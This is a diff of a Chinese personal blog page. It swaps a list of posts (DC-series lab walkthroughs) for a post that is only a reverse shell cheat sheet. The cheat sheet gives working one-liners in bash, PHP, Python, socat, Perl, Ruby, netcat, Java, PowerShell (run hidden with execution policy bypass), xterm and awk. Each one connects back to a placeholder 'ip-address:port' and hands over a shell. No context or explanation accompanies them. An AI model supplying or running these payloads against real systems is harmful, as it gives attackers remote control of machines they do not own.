@@ -8,8 +8,6 @@
   <meta name="author" content="Weeds" />
   <meta name="description" content="像地里的野草肆意生长" />
   
-    <meta name="robots" content="noindex" />
-  
   
   <title>
     
@@ -84,151 +82,99 @@
 
 
       <div class="flex-container">
-        <div class="container index">
-  <div class="post-list">
-    <!-- 遍历渲染文章 -->
-    
-      <div class="post-item" title="OD使用">
-        <div class="time-m-d">2021-01-26</div>
-        <div class="title">
-          <a href="/2021/01/26/3.od%E4%BD%BF%E7%94%A8/">
-            
-              
-                <span>OD使用</span>
-              
-            
-          </a>
-        </div>
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title"></div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-04-05 15:37:53
+        </span>
+        
       </div>
-    
-      <div class="post-item" title="常用工具介绍">
-        <div class="time-m-d">2021-01-25</div>
-        <div class="title">
-          <a href="/2021/01/25/2.%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/">
-            
-              
-                <span>常用工具介绍</span>
-              
-            
-          </a>
-        </div>
+      <div class="markdown-body">
+        <h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip-address&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip-address&quot;,port);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip-address&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><p>攻击机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:&#96;tty&#96;,raw,echo&#x3D;0 TCP-L:port</span><br></pre></td></tr></table></figure>
+<p>客户机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dev&#x2F;shm exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:ip-address:port</span><br></pre></td></tr></table></figure>
+<h2 id="prel"><a href="#prel" class="headerlink" title="prel"></a>prel</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$ip&#x3D;&quot;ip-address&quot;;$port&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($port,inet_aton($ip))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="prel-windows"><a href="#prel-windows" class="headerlink" title="prel windows"></a>prel windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#39;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;ip-address:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;ip-address&quot;,port).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  ip-address port -e &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;ip-address&#x2F;port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;ip-address&quot;,port);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2  &#x3D; $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure>
+<h2 id="xTerm"><a href="#xTerm" class="headerlink" title="xTerm"></a>xTerm</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xterm -display ip-address:port</span><br></pre></td></tr></table></figure>
+<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#39;BEGIN &#123;s &#x3D; &quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;ip-address&#x2F;port&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c !&#x3D; &quot;exit&quot;) close(s); &#125;&#125;&#39; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
       </div>
-    
-      <div class="post-item" title="壳与编程语言的基本认知">
-        <div class="time-m-d">2021-01-24</div>
-        <div class="title">
-          <a href="/2021/01/24/1.%E5%A3%B3%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AE%A4%E7%9F%A5/">
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
             
-              
-                <span>壳与编程语言的基本认知</span>
-              
+              <a href="/2021/04/05/Linux%E5%88%87%E6%8D%A2%E4%BA%A4%E4%BA%92%E5%BC%8F%E5%A4%96%E5%A3%B3/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
             
-          </a>
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-04-05 15:37:53
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
         </div>
-      </div>
+      
+    </div>
     
-      <div class="post-item" title="Plary">
-        <div class="time-m-d">2021-01-23</div>
-        <div class="title">
-          <a href="/2021/01/23/Player/">
-            
-              
-                <span>Plary</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="netstart">
-        <div class="time-m-d">2021-01-20</div>
-        <div class="title">
-          <a href="/2021/01/20/netstart/">
-            
-              
-                <span>netstart</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="DC-9">
-        <div class="time-m-d">2021-01-15</div>
-        <div class="title">
-          <a href="/2021/01/15/DC-9/">
-            
-              
-                <span>DC-9</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="DC-8">
-        <div class="time-m-d">2021-01-13</div>
-        <div class="title">
-          <a href="/2021/01/13/DC-8/">
-            
-              
-                <span>DC-8</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="DC-7">
-        <div class="time-m-d">2021-01-10</div>
-        <div class="title">
-          <a href="/2021/01/10/DC-7/">
-            
-              
-                <span>DC-7</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="DC-6">
-        <div class="time-m-d">2021-01-08</div>
-        <div class="title">
-          <a href="/2021/01/08/DC-6/">
-            
-              
-                <span>DC-6</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="DC-5">
-        <div class="time-m-d">2021-01-06</div>
-        <div class="title">
-          <a href="/2021/01/06/DC-5/">
-            
-              
-                <span>DC-5</span>
-              
-            
-          </a>
-        </div>
-      </div>
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bash"><span class="toc-text">bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-text">php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python"><span class="toc-text">python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socat"><span class="toc-text">socat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prel"><span class="toc-text">prel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prel-windows"><span class="toc-text">prel windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ruby"><span class="toc-text">ruby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat"><span class="toc-text">netcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java"><span class="toc-text">java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell"><span class="toc-text">powershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xTerm"><span class="toc-text">xTerm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#awk"><span class="toc-text">awk</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
     
   </div>
-  <nav class="post-navigation">
-    
-      <a href="/"><i class="iconfont icon-angleleft"></i></a>
-    
-    <span class="page-num">2 / 4</span>
-    
-      <a href="/page/3/"><i class="iconfont icon-angleright"></i></a>
-    
-  </nav>
-</div>
+
 
         <div class="footer">
   <div class="social">
